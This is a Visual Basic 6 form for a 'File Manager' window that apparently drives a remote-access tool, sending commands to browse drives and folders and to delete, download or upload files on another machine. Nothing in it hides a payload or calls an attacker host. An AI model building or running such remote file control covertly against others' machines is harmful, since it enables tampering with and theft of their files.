VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmFileManager 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "File Manager"
   ClientHeight    =   5925
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   7680
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5925
   ScaleWidth      =   7680
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog cmdlg 
      Left            =   3000
      Top             =   2640
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComctlLib.ProgressBar prgManage 
      Height          =   255
      Left            =   120
      TabIndex        =   6
      Top             =   5640
      Width           =   7455
      _ExtentX        =   13150
      _ExtentY        =   450
      _Version        =   393216
      Appearance      =   1
   End
   Begin VB.CommandButton cmdDelete 
      Caption         =   "Delete"
      Height          =   375
      Left            =   1920
      TabIndex        =   5
      Top             =   120
      Width           =   1815
   End
   Begin VB.CommandButton cmdUpload 
      Caption         =   "Upload"
      Height          =   375
      Left            =   3840
      TabIndex        =   4
      Top             =   120
      Width           =   1815
   End
   Begin VB.CommandButton cmdDownload 
      Caption         =   "Download"
      Height          =   375
      Left            =   5760
      TabIndex        =   3
      Top             =   120
      Width           =   1815
   End
   Begin MSComctlLib.ListView lstFolders 
      Height          =   4935
      Left            =   120
      TabIndex        =   1
      Top             =   600
      Width           =   3735
      _ExtentX        =   6588
      _ExtentY        =   8705
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   1
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Folders"
         Object.Width           =   5292
      EndProperty
   End
   Begin VB.ComboBox cmbDrives 
      Height          =   315
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   1695
   End
   Begin MSComctlLib.ListView lstFiles 
      Height          =   4935
      Left            =   3840
      TabIndex        =   2
      Top             =   600
      Width           =   3735
      _ExtentX        =   6588
      _ExtentY        =   8705
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   1
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Files"
         Object.Width           =   5292
      EndProperty
   End
End
Attribute VB_Name = "frmFileManager"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim sLastFolder As String
Const sSplit = "#^#"
Const sChunk = 4096

Private Sub cmdUpload_Click()
Dim sFile As String
With cmdlg
    .DialogTitle = "File to upload?"
    .ShowOpen
End With

frmMain.SendData "[STARTUPLOAD]" & sSplit & sLastFolder & "\" & cmdlg.FileTitle & Right(cmdlg.FileName, 4) & sSplit

Open cmdlg.FileName For Binary As #1
    prgManage.Max = LOF(1) + sChunk
    Do While Not EOF(1)
        sFile = Input(sChunk, #1)
        frmMain.SendData sFile
        prgManage.Value = prgManage.Value + sChunk
        DoEvents
    Loop
Close #1

prgManage.Value = 0
frmMain.SendData "[ENDOFFILE]"
End Sub

Private Sub Form_Load()
frmMain.SendData "[REFRESHDRIVES]" & sSplit & cmbDrives.Text & sSplit
End Sub

Private Sub cmdDelete_Click()
frmMain.SendData "[DELETEFILE]" & sSplit & sLastFolder & sSplit & lstFiles.SelectedItem.Text & sSplit
End Sub

Private Sub cmdDownload_Click()
frmMain.SendData "[DOWNLOAD]" & sSplit & sLastFolder & sSplit & lstFiles.SelectedItem.Text & sSplit
End Sub

Private Sub cmbDrives_Click()
frmMain.SendData "[CHANGEDRIVES]" & sSplit & cmbDrives.Text
End Sub

Private Sub Form_Unload(Cancel As Integer)
Me.Caption = "File Manager"
End Sub

Private Sub lstFolders_Click()
frmMain.SendData "[CHANGEFOLDER]" & sSplit & lstFolders.SelectedItem.Text
sLastFolder = lstFolders.SelectedItem.Text
End Sub
